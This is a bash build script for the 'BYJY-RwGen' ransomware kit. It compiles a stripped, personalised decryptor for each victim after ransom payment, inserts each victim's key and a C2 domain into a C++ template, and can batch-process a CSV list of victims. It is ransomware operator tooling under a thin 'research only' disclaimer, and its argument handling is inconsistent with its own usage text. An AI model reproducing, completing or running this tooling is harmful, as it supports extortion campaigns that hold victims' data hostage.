#!/bin/bash
# BYJY-RwGen Decryptor Builder
# Compiles personalized decryptors for victims after payment verification
# For defensive cybersecurity research purposes only

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
TEMPLATE_FILE="$SCRIPT_DIR/decryptor_linux_template.cpp"
OUTPUT_DIR="${1:-/tmp/decryptors}"

# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

# Function to build decryptor
build_decryptor() {
    local victim_id="$1"
    local encryption_key="$2"
    local c2_domain="${3:-localhost}"
    
    if [ -z "$victim_id" ] || [ -z "$encryption_key" ]; then
        log_message "ERROR: Missing required parameters"
        echo "Usage: $0 <output_dir> <victim_id> <encryption_key> [c2_domain]"
        exit 1
    fi
    
    log_message "Building decryptor for victim: $victim_id"
    
    # Create output directory
    mkdir -p "$OUTPUT_DIR"
    
    # Create personalized source file
    local source_file="$OUTPUT_DIR/decryptor_$victim_id.cpp"
    local output_file="$OUTPUT_DIR/decryptor_$victim_id.exe"
    
    if [ ! -f "$TEMPLATE_FILE" ]; then
        log_message "ERROR: Template file not found: $TEMPLATE_FILE"
        exit 1
    fi
    
    # Copy template and replace placeholders
    cp "$TEMPLATE_FILE" "$source_file"
    
    # Replace placeholders with actual values
    sed -i "s/{{VICTIM_ID}}/$victim_id/g" "$source_file"
    sed -i "s/{{ENCRYPTION_KEY}}/$encryption_key/g" "$source_file"
    sed -i "s/{{C2_DOMAIN}}/$c2_domain/g" "$source_file"
    
    log_message "✓ Source file personalized: $source_file"
    
    # Compile decryptor
    log_message "Compiling decryptor..."
    
    local compile_cmd=(
        "g++"
        "-std=c++17"
        "-O3"
        "-static-libgcc"
        "-static-libstdc++"
        "-pthread"
        "-DNDEBUG"
        "-s"  # Strip symbols
        "$source_file"
        "-o" "$output_file"
        "-lsodium"
        "-lcurl" 
        "-ljsoncpp"
    )
    
    if "${compile_cmd[@]}" 2>&1; then
        log_message "✓ Compilation successful: $output_file"
        
        # Verify file was created and is executable
        if [ -f "$output_file" ] && [ -x "$output_file" ]; then
            local file_size=$(stat -c%s "$output_file")
            log_message "✓ Decryptor ready (size: $file_size bytes)"
            
            # Clean up source file
            rm -f "$source_file"
            
            # Add execution metadata
            echo "# BYJY-RwGen Decryptor" > "$output_file.info"
            echo "Victim ID: $victim_id" >> "$output_file.info"
            echo "Generated: $(date)" >> "$output_file.info"
            echo "Algorithm: XChaCha20-Poly1305" >> "$output_file.info"
            echo "Research Tool: For academic cybersecurity research only" >> "$output_file.info"
            
            echo "$output_file"
            return 0
        else
            log_message "ERROR: Compiled file is not executable"
            return 1
        fi
    else
        log_message "ERROR: Compilation failed"
        log_message "Make sure dependencies are installed:"
        log_message "  apt-get install build-essential libsodium-dev libcurl4-openssl-dev libjsoncpp-dev"
        return 1
    fi
}

# Function to build multiple decryptors from config file
build_batch() {
    local config_file="$1"
    
    if [ ! -f "$config_file" ]; then
        log_message "ERROR: Config file not found: $config_file"
        exit 1
    fi
    
    log_message "Building decryptors from config: $config_file"
    
    local count=0
    local success=0
    
    while IFS=',' read -r victim_id encryption_key c2_domain; do
        # Skip header line and empty lines
        if [[ "$victim_id" == "victim_id" ]] || [[ -z "$victim_id" ]]; then
            continue
        fi
        
        count=$((count + 1))
        log_message "Building decryptor $count: $victim_id"
        
        if build_decryptor "$victim_id" "$encryption_key" "$c2_domain"; then
            success=$((success + 1))
        fi
        
    done < "$config_file"
    
    log_message "Batch build completed: $success/$count successful"
}

# Function to test decryptor
test_decryptor() {
    local decryptor_file="$1"
    
    if [ ! -f "$decryptor_file" ] || [ ! -x "$decryptor_file" ]; then
        log_message "ERROR: Decryptor file not found or not executable: $decryptor_file"
        return 1
    fi
    
    log_message "Testing decryptor: $decryptor_file"
    
    # Run decryptor with --help flag (if implemented)
    if timeout 5 "$decryptor_file" --help 2>/dev/null; then
        log_message "✓ Decryptor executable responds"
        return 0
    else
        log_message "⚠ Decryptor may not respond to --help (normal for this implementation)"
        return 0
    fi
}

# Function to install dependencies
install_dependencies() {
    log_message "Installing decryptor build dependencies..."
    
    # Update package list
    apt-get update
    
    # Install build tools
    apt-get install -y \
        build-essential \
        g++ \
        cmake \
        pkg-config \
        libsodium-dev \
        libcurl4-openssl-dev \
        libjsoncpp-dev \
        libssl-dev
    
    log_message "✓ Dependencies installed"
}

# Main script logic
case "$1" in
    build)
        shift
        build_decryptor "$@"
        ;;
    batch)
        shift
        build_batch "$@"
        ;;
    test)
        shift
        test_decryptor "$@"
        ;;
    deps)
        install_dependencies
        ;;
    *)
        echo "BYJY-RwGen Decryptor Builder"
        echo "For defensive cybersecurity research purposes only"
        echo ""
        echo "Usage: $0 <command> [options]"
        echo ""
        echo "Commands:"
        echo "  build <victim_id> <encryption_key> [c2_domain]"
        echo "    Build a personalized decryptor for specific victim"
        echo ""
        echo "  batch <config_file>"
        echo "    Build multiple decryptors from CSV config"
        echo "    CSV format: victim_id,encryption_key,c2_domain"
        echo ""
        echo "  test <decryptor_file>"
        echo "    Test if decryptor executable works"
        echo ""
        echo "  deps"
        echo "    Install required build dependencies"
        echo ""
        echo "Examples:"
        echo "  $0 build victim_001 0123456789abcdef localhost"
        echo "  $0 batch victims.csv"
        echo "  $0 test /tmp/decryptors/decryptor_victim_001.exe"
        echo ""
        exit 1
        ;;
esac